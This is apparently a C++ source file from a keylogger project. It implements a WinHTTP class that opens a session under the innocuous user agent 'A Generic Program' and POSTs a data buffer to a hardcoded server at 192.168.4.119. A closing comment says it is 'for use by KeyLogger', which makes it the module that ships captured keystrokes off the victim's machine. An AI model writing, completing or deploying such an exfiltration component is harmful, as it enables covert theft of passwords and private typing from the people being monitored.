#include "RequestSender.h"

void RequestSender::createSession() 
{
	currSession = WinHttpOpen
	(
		L"A Generic Program",
		WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
		NULL,
		NULL,
		0
	);
	/*
	DWORD timeout = 50;
	WinHttpSetOption
	(
		currSession,
		WINHTTP_OPTION_CONNECT_TIMEOUT,
		&timeout, 
		sizeof(DWORD)
	);
	DWORD data;
	DWORD dwSize = sizeof(DWORD);
	if (WinHttpQueryOption(currSession,
		WINHTTP_OPTION_CONNECT_TIMEOUT,
		&data, &dwSize))
	{
		std::cout << "Connection timeout : " << data << std::endl;
	}
	*/
}

// specify http server to connect to using WinHttpConnect
void RequestSender::connToServer()
{
	if (currSession)
	{
		// session handle was created successfully, now create connection handle
		currConnection = WinHttpConnect
		(
			currSession,
			L"192.168.4.119",
			80,
			0
		);
	}
}

// open HTTP request, returns a HINTERNET handle to request to send and storing it in currRequest
void RequestSender::openRequest() 
{
	if (currConnection)
	{
		// connection handle opened successfully, now for request handle
		currRequest = WinHttpOpenRequest
		(
			currConnection,
			L"POST",
			NULL,
			NULL,
			WINHTTP_NO_REFERER,
			WINHTTP_DEFAULT_ACCEPT_TYPES,
			0
		);
	}
}

// uses WinHttpSendRequest to connect to server and send request to site- in our case this is a POST request
void RequestSender::sendRequest(char* dataToSend, int outputSize) 
{
	if (currRequest)
	{
		DWORD dataSize = sizeof(*dataToSend) / sizeof(dataToSend[0]);
		stepSuccessful = WinHttpSendRequest
		(
			currRequest,
			WINHTTP_NO_ADDITIONAL_HEADERS,
			0,
			dataToSend,
			(DWORD)outputSize,
			(DWORD)outputSize,
			0
		);
	}

	// end the request if it was sent successfully
	if (stepSuccessful)
	{
		stepSuccessful = WinHttpReceiveResponse(currRequest, NULL);
	}
}

// prepare request handle to receive via WinHttpReceiveResponse and download resource with ReadData (read available data) & QueryDataAvailable (how much data to download)
void RequestSender::receiveResponse() 
{
	DWORD sizeOfData = 0;
	// if ending request was a success
	if (!stepSuccessful)
	{
		;
	}
	else
	do
	{
		// checking for available data
		sizeOfData = 0;
		// stores available data in value pointed to by sizeOfData
		WinHttpQueryDataAvailable(currRequest, &sizeOfData);

		// allocate space for buffer on the heap (signified by new operator)
		LPSTR responseReceived = new char[sizeOfData + 1];
		if(!responseReceived)
		{
			sizeOfData = 0;
		}
		else
		{
			DWORD downloaded = 0;
			// TO-DO: finish this, based on https://docs.microsoft.com/en-us/windows/win32/api/winhttp/nf-winhttp-winhttpconnect
			// fill the block of memory pointed to by responseReceived with 0s- freeing the memory of size sizeOfData+1
			ZeroMemory(responseReceived, sizeOfData + 1);

			if (!WinHttpReadData(currRequest, (LPVOID)responseReceived, sizeOfData, &downloaded))
			{
				;
			}
			else
			{
				;
			}
			// freeing memory allocated to buffer
			delete[] responseReceived;
		}

	} while (sizeOfData > 0);
}

// close any open handles using WinHttpCloseHandle
void RequestSender::closeHandles() 
{
	if (currRequest) WinHttpCloseHandle(currRequest);
	if (currConnection) WinHttpCloseHandle(currConnection);
	if (currSession) WinHttpCloseHandle(currSession);
}

// makes use of all above methods- a wrapper method for use by KeyLogger
void RequestSender::sendDataAcross(char* dataToSend, int outputSize)
{
	createSession();
	connToServer();
	openRequest();
	sendRequest(dataToSend, outputSize);
	receiveResponse();
	closeHandles();
	stepSuccessful = false;
}